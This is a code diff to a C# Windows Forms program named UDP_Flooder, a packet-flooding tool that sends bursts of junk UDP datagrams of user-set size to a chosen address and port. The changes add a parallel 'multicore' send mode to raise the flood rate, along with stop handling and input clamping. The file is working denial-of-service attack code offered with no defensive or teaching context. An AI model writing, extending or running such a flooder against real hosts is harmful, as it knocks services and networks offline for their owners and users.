@@ -26,7 +26,6 @@ namespace UDP_Flooder
             }
             else
             {
-                
                 return size;
             }
         }
@@ -36,18 +35,38 @@ namespace UDP_Flooder
         public void sock(string address, int port)
         {
             UdpClient client = new UdpClient(address, port);
-            while (isEnabled)
+            while (isEnabled) //Double isEnabled so that we can stop the function immediately when the stop button is clicked
             {
                 byte[] rubbish = new byte[sizegen()]; //Creates table of bytes which contain individual bytes eg. [0x20, 0x20...]
-                for (int i = 1; i < numericUpDown3.Value; i++) //for each socket we send however many actions that were set
+                if (!enableMulticoreToolStripMenuItem.Checked)
                 {
-                    client.Send(rubbish, rubbish.Length); //Each byte in the variable is 1 byte large, so the length is equal to the size of the data sent.
-                    if (enableByteCounterToolStripMenuItem.Checked)
+                    for (int i = 1; i < numericUpDown3.Value && isEnabled; i++) //for each socket we send however many actions that were set
                     {
-                        label8.Visible = true;
-                        sizeCount = sizeCount + rubbish.Length;
-                        label8.Text = string.Concat("Bytes sent: ", sizeCount);
+                        client.Send(rubbish, rubbish.Length); //Each byte in the variable is 1 byte large, so the length is equal to the size of the data sent.
+                        if (enableByteCounterToolStripMenuItem.Checked)
+                        {
+                            label8.Visible = true;
+                            sizeCount += rubbish.Length;
+                            label8.Text = string.Concat("Bytes sent: ", sizeCount);
+                        }
                     }
+                }
+                else
+                {
+                    Parallel.For(1, Convert.ToInt32(numericUpDown3.Value), i => //Just copy-pasted the previous function but changed to Parallel.For
+                    {
+                        if (isEnabled)
+                        {
+                            client.Send(rubbish, rubbish.Length);
+                            if (enableByteCounterToolStripMenuItem.Checked)
+                            {
+                                label8.Visible = true;
+                                sizeCount += rubbish.Length;
+                                label8.Text = string.Concat("Bytes sent: ", sizeCount);
+                            }
+                        }
+                    });
+
                 }
                 Thread.Sleep(Convert.ToInt32(numericUpDown2.Value)); //delay in between bursts (if you left the delay on at least)
             }
@@ -67,7 +86,7 @@ namespace UDP_Flooder
             this.MaximizeBox = false;
             trackBar1.TickStyle = TickStyle.None; //It looked annoying enough
         }
-        
+
         private void button1_Click(object sender, EventArgs e)
         {
             button1.Text = isEnabled ? "Start" : "Stop";
@@ -86,7 +105,7 @@ namespace UDP_Flooder
 
         private void trackBar1_Scroll(object sender, EventArgs e)
         {
-            label4.Text = trackBar1.Value != 1 ? "Bytes":"Byte"; //Ever seen "1 bytes"?
+            label4.Text = trackBar1.Value != 1 ? "Bytes" : "Byte"; //Ever seen "1 bytes"?
             textBox3.Text = trackBar1.Value.ToString();
         }
 
@@ -140,13 +159,13 @@ namespace UDP_Flooder
             textBox3.Text = textBox3.Text.Replace(" ", string.Empty);
             try
             {
-                Int64 boxVal = Convert.ToInt64(textBox3.Text); //In case user types some really large number for some reason
-                if (boxVal <= 0)
+                double boxVal = Convert.ToDouble(textBox3.Text); //In case user types some really large number for some reason
+                if (boxVal < 1)
                 {
                     trackBar1.Value = 1;
                     textBox3.Text = "1";
                 }
-                else if (boxVal >= 65000)
+                else if (boxVal > 65000)
                 {
                     trackBar1.Value = 65000;
                     textBox3.Text = "65000";
@@ -161,7 +180,7 @@ namespace UDP_Flooder
             {
                 if (textBox3.Text != "") //I warned you
                 {
-                    trackBar1.Value = 1; //Very flawed stuff here but at least it eliminates the errors
+                    trackBar1.Value = 1; //I don't actually remember what I'm trying to achieve here so I'll leave it like that
                     textBox3.Text = "1";
                     label4.Text = "Byte";
                 }
